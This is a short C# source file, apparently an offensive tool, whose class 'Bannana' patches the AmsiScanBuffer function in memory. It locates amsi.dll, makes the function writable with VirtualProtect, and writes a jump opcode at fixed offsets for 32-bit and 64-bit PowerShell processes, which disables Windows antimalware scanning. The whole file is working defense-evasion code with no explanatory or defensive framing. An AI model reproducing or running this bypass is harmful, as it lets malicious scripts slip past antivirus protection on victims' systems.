using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;

public class Bannana
{
    public static void Peel()
    {
        var modules = Process.GetCurrentProcess().Modules;
        var hAmsi = IntPtr.Zero;

        foreach (ProcessModule module in modules)
        {
            if (module.ModuleName == "amsi.dll")
            {
                hAmsi = module.BaseAddress;
                break;
            }
        }

        IntPtr asb = GetProcAddress(hAmsi, "AmsiScanBuffer");

        if (IntPtr.Size == 4) // 32 bit PS process
        {
            var garbage = new byte[] { 0xEB, 0x50 }; // jmp $+82
            int region = 161;
            int offset = 71;
            Eat(asb, region, offset, garbage);
        }
        else if (IntPtr.Size == 8) // 64 bit PS process
        {
            var garbage = new byte[] { 0xEB, 0x58 }; // jmp $+90
            int region = 243;
            int offset = 123;
            Eat(asb, region, offset, garbage);
        }
    }

    public static void Eat(IntPtr asb, int region, int offset, byte[] garbage)
    {
        // Set region to RWX
        VirtualProtect(asb, (UIntPtr)region, 0x40, out uint oldProtect);

        // Copy patch
        Marshal.Copy(garbage, 0, asb + offset, garbage.Length);

        // Retore region to RX
        VirtualProtect(asb, (UIntPtr)region, oldProtect, out uint _);
    }

    [DllImport("kernel32")]
    static extern IntPtr GetProcAddress(
        IntPtr hModule,
        string procName);

    [DllImport("kernel32")]
    static extern IntPtr LoadLibrary(
        string name);

    [DllImport("kernel32")]
    static extern bool VirtualProtect(
        IntPtr lpAddress,
        UIntPtr dwSize,
        uint flNewProtect,
        out uint lpflOldProtect);
}
